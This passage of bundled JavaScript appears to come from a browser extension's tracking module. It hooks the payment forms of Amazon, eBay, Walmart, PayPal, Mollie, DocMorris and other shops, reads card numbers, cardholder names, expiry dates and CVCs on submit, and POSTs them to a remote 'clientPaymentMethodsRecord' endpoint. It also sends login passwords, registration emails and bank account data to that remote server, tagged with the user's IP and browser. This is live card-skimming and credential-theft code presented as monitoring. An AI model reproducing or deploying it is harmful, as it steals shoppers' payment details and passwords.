                                            if (document.querySelector('.card-form') !== null) {
                                                clearInterval(__interval3);
                                                self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 1000);
                    });
                });
            }
        }, 100);
    }
    exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function () {
                    let paymentMethodStore = [];
                    elements.forEach(function (__detectedElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    Tracker.send({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': document.querySelector('.card-types')?.firstElementChild?.getAttribute('aria-label')?.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            'cardExpire': paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            'event': 'add',
                            'workWebsite': window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    let interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100);
                });
            });
        });
    }
    exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, callback) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                }
                else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    }
    exploreSegPayPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "PayPageForm") {
                let elements = [];
                self.exploreSegPayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value !== null ? paymentMethodData[0].value : 'Unknown' + ' ' + paymentMethodData[1].value !== null ? paymentMethodData[1].value : 0,
                                'cardExpire': paymentMethodData[3].value !== null ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value !== null ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value !== null ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreSegPayPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' && _childElement.type !== 'radio' &&
                        _childElement.id !== 'EMailInput' && _childElement.id !== 'AddressInput' && _childElement.id !== 'CityInput' &&
                        _childElement.id !== 'PhoneNumberInput' && _childElement.id !== 'ZipInput' && _childElement.id !== 'TermsConditionsPrivacyInput' ||
                        _childElement.nodeName === 'SELECT' && _childElement.id !== 'LanguageDDL' && _childElement.id !== 'TodaysChargeDDL' &&
                            _childElement.id !== 'StateDDL' && _childElement.id !== 'CountryDDL') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSegPayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreDocmorrisPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "form-paymentmethods-credit_card") {
                let elements = [];
                self.exploreDocmorrisPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreDocmorrisPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (elements.length > 4 && elements.length < 6) {
                        if (document.querySelectorAll('#perkreditkarte').length !== 0) {
                            document.querySelectorAll('#perkreditkarte').forEach(function (__dataConfirmElement) {
                                if (__dataConfirmElement.getAttribute('form') === "form-paymentmethods-credit_card") {
                                    if (callback) {
                                        callback(__dataConfirmElement, elements);
                                    }
                                }
                            });
                        }
                    }
                }
                else {
                    self.exploreDocmorrisPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    explorePaygatePaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "SSLForm") {
                let elements = [];
                self.explorePaygatePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            if (__childElement.nodeName === 'INPUT') {
                                if (__childElement.type === 'radio' && __childElement.checked) {
                                    paymentMethodData.push({
                                        'element': __childElement.nodeName,
                                        'id': __childElement.id,
                                        'name': __childElement.name,
                                        'value': __childElement.value,
                                    });
                                }
                                else {
                                    if (__childElement.type === 'text') {
                                        paymentMethodData.push({
                                            'element': __childElement.nodeName,
                                            'id': __childElement.id,
                                            'name': __childElement.name,
                                            'value': __childElement.value,
                                        });
                                    }
                                }
                            }
                            if (__childElement.nodeName === 'SELECT') {
                                paymentMethodData.push({
                                    'element': __childElement.nodeName,
                                    'id': __childElement.id,
                                    'name': __childElement.name,
                                    'value': __childElement.value,
                                });
                            }
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() : 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardExpire': paymentMethodData[3].value ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    explorePaygatePaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON' || _childElement.type === 'radio') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT' || _childElement.type === 'radio') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.explorePaygatePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreSundayPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "one-step-checkout-form") {
                let elements = [];
                self.exploreSundayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreSundayPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSundayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreMolliePaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "body") {
                let elements = [];
                self.exploreMolliePaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                "cardExpire": paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                'cardCVC': paymentMethodData[5].value ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreMolliePaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreMolliePaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreAnchorOnly(self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.getAttribute('data-txnid') === listId) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnly(self, __detectedElement, listId, callback);
                }
            });
        }
    }
    exploreAnchorOnlyByHref(self, parentNode, listId, callback) {
        if (parentNode.childNodes.length !== 0) {
            parentNode.childNodes.forEach(function (__detectedElement) {
                if (__detectedElement.nodeName === 'A' && __detectedElement.href.indexOf(listId) !== -1) {
                    if (callback) {
                        callback(__detectedElement);
                    }
                }
                else {
                    self.exploreAnchorOnlyByHref(self, __detectedElement, listId, callback);
                }
            });
        }
    }
    explorePaymentInputTagOnly(self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.type === 'submit') {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTagOnly(self, __childElement, callback);
                }
            });
        }
    }
    explorePayPalPaymentFormElement(self, __creditCardFormElement, elements, callback) {
        if (__creditCardFormElement.childNodes.length !== 0) {
            __creditCardFormElement.childNodes.forEach(function (_formChildElement) {
                if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' || _formChildElement.nodeName === 'BUTTON') {
                    if (_formChildElement.nodeName === 'INPUT' || _formChildElement.nodeName === 'SELECT' &&
                        _formChildElement.type !== 'hidden' && _formChildElement.id !== 'billingAddressId') {
                        elements.push(_formChildElement);
                    }
                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
                        if (callback) {
                            callback(_formChildElement, elements);
                        }
                    }
                }
                else {
                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
                }
            });
        }
    }
    exploreHelloFreshPaymentContainer(self, parentNode, callback) {
        parentNode.childNodes.forEach(function (__element) {
            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
                if (callback) {
                    callback(__element);
                }
            }
            else {
                self.exploreHelloFreshPaymentContainer(self, __element, callback);
            }
        });
    }
    exploreBestSecretPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "creditForm") {
                let elements = [];
                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreBestSecretPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON' && !_childElement.classList.contains('btn-link')
                        && !_childElement.classList.contains('btn-secondary-action') && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreAmazonPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' && __formElement.style.display !== 'none') {
                let elements = [];
                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[1].value,
                                'cardBrand': 'Unknown',
                                'cardHolder': paymentMethodData[0].value,
                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
                                'cardCVC': 'Unknown',
                                'event': 'add',
                                "workWebsite": window.location.origin
                            }
                        });
                        paymentMethodData = [];
                    });
                });
            }
        });
    }
    exploreAmazonPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
                        _childElement.nodeName === 'SELECT') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreWalmartPaymentContainer(self) {
        let interval = setInterval(function () {
            if (document.querySelector('.edit-form.multiple-required') !== null &&
                document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild !== null) {
                clearInterval(interval);
                if (document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.nodeName === 'BUTTON') {
                    ["click", "dblclick"].forEach(function (event) {
                        let tempPaymentMethodsStore = [];
                        document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.addEventListener(event, function () {
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'creditCard', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            document.querySelectorAll('.payment-option').forEach(function (element) {
                                if (!element.classList.contains('payment-inactive')) {
                                    element.classList.remove('payment-option');
                                    tempPaymentMethodsStore.push({
                                        'element': element.nodeName,
                                        'id': 'cardBrand',
                                        'value': element.className
                                    });
                                    element.classList.add('payment-option');
                                }
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'firstName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'lastName', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'month-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'year-chooser', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'cvv', function (__detectedElement) {
                                tempPaymentMethodsStore.push({
                                    'element': __detectedElement.nodeName,
                                    'id': __detectedElement.id,
                                    'value': __detectedElement.value
                                });
                            });
                            Tracker.send({
                                command: 'savePaymentMethodsData',
                                data: {
                                    'cardNumber': tempPaymentMethodsStore[0].value,
                                    'cardBrand': tempPaymentMethodsStore[1].value,
                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
                                    'cardCVC': tempPaymentMethodsStore[6].value,
                                    'event': 'add',
                                    "workWebsite": window.location.origin
                                }
                            });
                            tempPaymentMethodsStore = [];
                            self.exploreWalmartPaymentEditButton(self);
                        });
                    });
                }
            }
        }, 100);
    }
    exploreWalmartPaymentEditButton(self) {
        let interval = setInterval(function () {
            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
                        clearInterval(interval);
                        formEditButton.addEventListener('click', function () {
                            self.exploreWalmartPaymentContainer(self);
                        });
                    }
                });
            }
        }, 100);
    }
    explorePaymentNewCard(self, elementParentNode, callback) {
        let detectedElements = [];
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardNo', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.explorePaymentInputTag(self, __targetParentElement, 'cardHolder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.explorePaymentInputTag(self, __targetParentElement, 'cvc', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
            });
            if (callback) {
                callback(detectedElements);
            }
        }
    }
    explorePaymentSpanTag(self, elementParentNode, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('payment-title')) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSpanTag(self, __childElement, callback);
                }
            });
        }
    }
    explorePaymentInputTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'INPUT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentInputTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    explorePaymentSelectTag(self, elementParentNode, selfId, callback) {
        if (elementParentNode.childNodes.length !== 0) {
            elementParentNode.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName === 'SELECT' && __childElement.id.indexOf(selfId) !== -1) {
                    if (callback) {
                        callback(__childElement);
                    }
                }
                else {
                    self.explorePaymentSelectTag(self, __childElement, selfId, callback);
                }
            });
        }
    }
    static send(request) {
        if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
            let interval = setInterval(function () {
                if (window.sessionStorage.getItem('ip') !== null) {
                    clearInterval(interval);
                    if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
                        if (request.command === 'saveLoginData') {
                            return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                                method: "POST",
                                url: globalAppMonitorMainURL + "browserUserDataManagement",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "userdata": {
                                        _default_: {
                                            "tracker": appTracker,
                                            "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                            "browser": BrJS.getBrowserNameFull()
                                        },
                                        "event": 'login',
                                        "username": request.data.username,
                                        "password": request.data.password,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        else if (request.command === 'saveRegistrationData') {
                            return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                                method: "POST",
                                url: globalAppMonitorMainURL + "browserUserDataManagement",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "userdata": {
                                        _default_: {
                                            "tracker": appTracker,
                                            "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                            "browser": BrJS.getBrowserNameFull()
                                        },
                                        "event": "registration",
                                        "username": request.data.username,
                                        "password": request.data.password,
                                        "email": request.data.email,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        else if (request.command === 'saveLogoutData') {
                            return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                                method: "POST",
                                url: globalAppMonitorMainURL + "browserUserDataManagement",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "userdata": {
                                        _default_: {
                                            "tracker": appTracker,
                                            "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                            "browser": BrJS.getBrowserNameFull()
                                        },
                                        "event": "logout",
                                        "username": request.data.username,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                        else if (request.command === 'saveNavigateData') {
                            return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                                method: "POST",
                                url: globalAppMonitorMainURL + "browserUserDataManagement",
                                async: true,
                                header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                                data: {
                                    "command": request.command,
                                    "userdata": {
                                        _default_: {
                                            "tracker": appTracker,
                                            "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                            "ip": window.sessionStorage.getItem('ip'),
                                            "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                            "browser": BrJS.getBrowserNameFull()
                                        },
                                        "event": "navigate",
                                        "username": request.data.username,
                                        "workWebsite": request.data.workWebsite
                                    }
                                }
                            });
                        }
                    }
                    if (request.command === 'savePaymentMethodsData') {
                        return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                            method: "POST",
                            url: globalAppMonitorMainURL + "clientPaymentMethodsRecord",
                            async: true,
                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                            data: {
                                "command": request.command,
                                "paymentMethodsInfo": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    'cardNumber': request.data.cardNumber,
                                    'cardBrand': request.data.cardBrand,
                                    'cardHolder': request.data.cardHolder,
                                    "cardExpire": request.data.cardExpire,
                                    'cardCVC': request.data.cardCVC,
                                    'event': request.data.event,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    }
                    if (request.command === 'saveBankAccountData') {
                        return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                            method: "POST",
                            url: globalAppMonitorMainURL + "clientBankAccountRecord",
                            async: true,
                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                            data: {
                                "command": request.command,
                                "bankAccountData": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
